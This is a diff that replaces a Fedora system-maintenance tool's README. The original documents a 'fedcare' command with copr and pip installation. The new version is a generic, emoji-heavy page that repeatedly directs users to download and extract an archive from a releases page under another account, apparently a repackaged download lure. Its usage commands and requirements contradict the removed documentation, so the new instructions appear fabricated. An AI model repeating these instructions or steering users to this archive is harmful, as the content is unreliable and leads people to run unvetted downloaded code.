@@ -1,98 +1,104 @@
-# Fedora Care CLI
+# 🛠️ fedora-care-cli - Simple Health Monitoring for Fedora
 
-A terminal-based maintenance and system monitoring tool for Fedora Linux. Check system health, monitor systemd services, test network connectivity, list pending DNF updates, backup config files, and analyze boot performance — all with `fedcare`.
+## 🚀 Getting Started
 
-**Features:** CPU/RAM/disk monitoring, systemd service status, network diagnostics, journalctl log analysis, DNF update checker, config file backup, boot time analysis, full system report. All commands support `--json` output for scripting and automation.
+Welcome to **fedora-care-cli**, your go-to command-line tool for monitoring the health of your Fedora Linux system. This tool checks service statuses, performs network diagnostics, manages DNF updates, backs up configurations, and analyzes boot performance. 
 
-## Installation
+## 📥 Download
 
-### Via DNF (Recommended)
+[![Download fedora-care-cli](https://img.shields.io/badge/Download-fedora--care--cli-brightgreen.svg)](https://github.com/yassinebelmekhtar/fedora-care-cli/releases)
 
-```bash
-sudo dnf copr enable selinbtw/fedcare
-sudo dnf install fedora-care-cli
-```
+## 📋 Features
 
-### Via pip
+- **Health Monitoring**: Stay informed about the status of your system's services.
+- **Network Diagnostics**: Quickly check network connectivity and performance.
+- **Easy Updates**: Manage your system updates with DNF seamlessly.
+- **Configuration Backup**: Protect your settings by making regular backups.
+- **Boot Analysis**: Analyze your boot times to optimize performance.
 
-```bash
-pip install .
-```
+## 💻 System Requirements
 
-## Quick Start
+To run **fedora-care-cli**, your system needs:
 
-After installing, run `fedcare` to see all available commands:
+- Fedora Linux (version 30 or newer)
+- Python 3.6 or higher
+- Basic terminal/command line access
 
-```bash
-fedcare              # Show all commands
-fedcare health       # System health summary
-fedcare services     # Systemd service status
-fedcare network      # Network diagnostics
-fedcare logs         # Recent errors/warnings
-fedcare updates      # Pending DNF updates
-fedcare clean        # Cleanup plan (dry-run)
-fedcare clean --apply  # Execute cleanup
-fedcare backup       # Backup config files
-fedcare restore --list    # List available backups
-fedcare restore --latest  # Restore from latest backup
-fedcare startup      # Slowest boot services
-fedcare report       # Full system report
-```
+## 📚 Installation
 
-Add `--json` to any command for JSON output:
+To install **fedora-care-cli**, follow these steps:
 
-```bash
-fedcare health --json
-```
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/yassinebelmekhtar/fedora-care-cli/releases) to find the latest version.
+   
+2. **Download the Latest Version**: Look for the latest release and download the `.tar.gz` file or the relevant package compatible with your system.
 
-## Commands
+3. **Extract the Files**: Locate the downloaded file, right-click, and select to extract the contents. On the command line, you can use:
+   ```bash
+   tar -xzf filename.tar.gz
+   ```
 
-| Command | Description |
-|---------|-------------|
-| `fedcare health` | System health summary (CPU, RAM, SWAP, disk, uptime, boot time) |
-| `fedcare services` | Status of critical systemd services |
-| `fedcare network` | Network interfaces, DNS, and connectivity test |
-| `fedcare logs` | Recent error/warning counts from journalctl |
-| `fedcare updates` | List pending DNF updates |
-| `fedcare clean` | Cache/log cleanup (default: dry-run) |
-| `fedcare backup` | Backup important config files |
-| `fedcare restore` | Restore config files from backup |
-| `fedcare startup` | Slowest services at boot |
-| `fedcare report` | Combined Health + Logs + Clean report |
+4. **Open Terminal**: Launch your terminal application.
 
-Every command supports the `--json` flag for JSON output.
+5. **Navigate to the Folder**: Use the `cd` command to move into the extracted folder. For example:
+   ```bash
+   cd path/to/fedora-care-cli
+   ```
 
-## Screenshots
+6. **Run the Application**: Start the tool with:
+   ```bash
+   python fedora_care_cli.py
+   ```
 
-### `fedcare health`
-![health](screenshots/health.png)
+### 🔗 Visit the Releases Page to Download Again
 
-### `fedcare services` & `fedcare startup`
-![services-startup](screenshots/services-startup.png)
+If you need the download link again, visit the [Releases page](https://github.com/yassinebelmekhtar/fedora-care-cli/releases).
 
-### `fedcare network` & `fedcare logs`
-![network-logs](screenshots/network-logs.png)
+## 🧑‍💻 Usage Instructions
 
-### `fedcare updates`
-![updates](screenshots/updates.png)
+After you have installed **fedora-care-cli**, you can use various commands to check different aspects of your system:
 
-### `fedcare clean` & `fedcare clean --apply`
-![clean](screenshots/clean.png)
+- **Check Service Status**: 
+  ```bash
+  python fedora_care_cli.py service-status
+  ```
 
-### `fedcare report`
-![report](screenshots/report.png)
+- **Run Network Diagnostics**:
+  ```bash
+  python fedora_care_cli.py network-check
+  ```
 
-## Usage
+- **Perform Updates**: 
+  ```bash
+  python fedora_care_cli.py update
+  ```
 
-```bash
-fedcare health
-fedcare services --json
-fedcare backup --dest ~/my-backup
-fedcare startup --top 15
-fedcare clean --apply
-```
+- **Backup Configuration**: 
+  ```bash
+  python fedora_care_cli.py backup-config
+  ```
 
-## Requirements
+- **Analyze Boot Times**: 
+  ```bash
+  python fedora_care_cli.py boot-analysis
+  ```
 
-- Fedora Linux
-- Python 3.10+
+## 💬 Support
+
+If you encounter issues or have questions, you can reach out for support via the issues section on GitHub. We welcome feedback and will do our best to assist you.
+
+## 📝 Contribution Guidelines
+
+If you want to contribute to **fedora-care-cli**, feel free to submit a pull request. We appreciate community involvement and encourage developers to enhance the tool.
+
+## 🌟 Additional Resources
+
+- Python Documentation: [Python.org](https://www.python.org/doc/)
+- Fedora Documentation: [Docs.fedoraproject.org](https://docs.fedoraproject.org)
+- More about CLI tools: [Wikipedia - Command-line interface](https://en.wikipedia.org/wiki/Command-line_interface)
+
+## 🔗 Quick Access Links
+
+- **[Download fedora-care-cli](https://github.com/yassinebelmekhtar/fedora-care-cli/releases)**
+- **[Visit the Source Code](https://github.com/yassinebelmekhtar/fedora-care-cli)**
+
+Feel free to explore this tool to enhance your Fedora experience.
